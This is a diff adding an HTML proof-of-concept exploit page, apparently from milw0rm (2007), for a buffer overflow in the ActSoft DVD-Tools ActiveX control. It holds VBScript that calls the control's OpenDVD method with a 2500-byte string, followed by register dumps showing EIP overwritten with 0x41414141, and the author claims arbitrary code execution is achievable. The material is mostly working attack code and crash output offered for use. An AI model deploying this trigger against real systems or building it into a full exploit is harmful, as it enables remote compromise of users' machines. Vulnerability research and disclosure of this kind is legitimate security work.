@@ -1,0 +1,86 @@
+<html>
+<font face="Courier New" size="2">
+-------------------------------------------------------------------------------------------------
+<br>ActSoft DVD-Tools (dvdtools.ocx) Buffer Overflow
+<br>developer's url: <a href=http://www.activex-soft.com/>http://www.activex-soft.com</a>
+<br>author: shinnai
+<br>mail: shinnai[at]autistici[dot]org
+<br>site: <a href=http://shinnai.altervista.org>http://shinnai.altervista.org</a>
+<br>Tested on Windows XP Professional SP2 all patched, with Internet Explorer 7
+<br>This product is selled under 1 Developer License for $129 and under Site Wide License for $499 :)
+<br><br>Using only 400 characters will cause just a crash of IE7 (or of the software that use this
+<br>activex), encreasing the number of characters EIP will be overwrite and arbitrary code execution
+<br>will be possible.
+<br>-------------------------------------------------------------------------------------------------</font>
+<br>
+<br><br><object classid='clsid:894A633E-F261-28BD-96F3-380EBEE1BADE' id='DVD_TOOLS' ></object>
+<br><br><input type="button" value="Click here to start the test" language="VBScript" OnClick="VBButtonClicked()">
+
+<script language="VBScript">
+
+sub VBButtonClicked()
+	ActiveX_File = "C:\Programmi\ActiveX Soft\ActSoft DVD-Tools\dvdtools.ocx"
+	Method = "OpenDVD"
+	Variable_Declaration = "Sub OpenDVD ( ByVal path As String )"
+
+	ArgCount = 1
+
+	Arg1=String(2500,"A")
+
+	DVD_TOOLS.OpenDVD Arg1
+
+End Sub
+
+</script>
+<br>
+<br><br><font face="Courier New" size="2">This is a dump of registers
+<br>12:18:20.295  pid=0D6C tid=0AD0  EXCEPTION (first-chance)
+<br>              ----------------------------------------------------------------
+<br>              Exception C0000005 (ACCESS_VIOLATION reading [414145C5])
+<br>              ----------------------------------------------------------------
+<br>              EAX=41414141: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+<br>              EBX=0174F414: 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41
+<br>              ECX=000097F9: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+<br>              EDX=0174FC0C: 6F 00 00 00 00 00 00 00-60 60 1C 03 01 00 74 01
+<br>              ESP=0174F080: 50 F1 74 01 68 3A 14 00-6B 1F 94 7C 41 1C 94 7C
+<br>              EBP=0174F3F8: 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41
+<br>              ESI=00000008: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+<br>              EDI=031AD432: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00
+<br>              EIP=047A184D: 8B 90 84 04 00 00 8D 88-7C 04 00 00 85 D2 7E 09
+<br>                            --> N/A
+<br>              ----------------------------------------------------------------
+<br>
+<br>12:18:20.311  pid=0D6C tid=0AD0  EXCEPTION (first-chance)
+<br>              ----------------------------------------------------------------
+<br>              Exception C0000005 (ACCESS_VIOLATION reading [41414141])
+<br>              ----------------------------------------------------------------
+<br>              EAX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+<br>              EBX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+<br>              ECX=41414141: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+<br>              EDX=7C9137D8: 8B 4C 24 04 F7 41 04 06-00 00 00 B8 01 00 00 00
+<br>              ESP=0174ECB0: BF 37 91 7C 98 ED 74 01-EC F3 74 01 B4 ED 74 01
+<br>              EBP=0174ECD0: 80 ED 74 01 8B 37 91 7C-98 ED 74 01 EC F3 74 01
+<br>              ESI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+<br>              EDI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+<br>              EIP=41414141: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+<br>                            --> N/A
+<br>              ----------------------------------------------------------------
+<br>
+<br>12:18:20.311  pid=0D6C tid=0AD0  EXCEPTION (first-chance)
+<br>              ----------------------------------------------------------------
+<br>              Exception C0000005 (ACCESS_VIOLATION reading [41414141])
+<br>              ----------------------------------------------------------------
+<br>              EAX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+<br>              EBX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+<br>              ECX=41414141: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+<br>              EDX=7C9137D8: 8B 4C 24 04 F7 41 04 06-00 00 00 B8 01 00 00 00
+<br>              ESP=0174E8E0: BF 37 91 7C C8 E9 74 01-EC F3 74 01 E4 E9 74 01
+<br>              EBP=0174E900: B0 E9 74 01 8B 37 91 7C-C8 E9 74 01 EC F3 74 01
+<br>              ESI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+<br>              EDI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+<br>              EIP=41414141: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+<br>                            --> N/A
+<br>              ----------------------------------------------------------------
+<br>To be continued...</font>
+
+# milw0rm.com [2007-02-14]
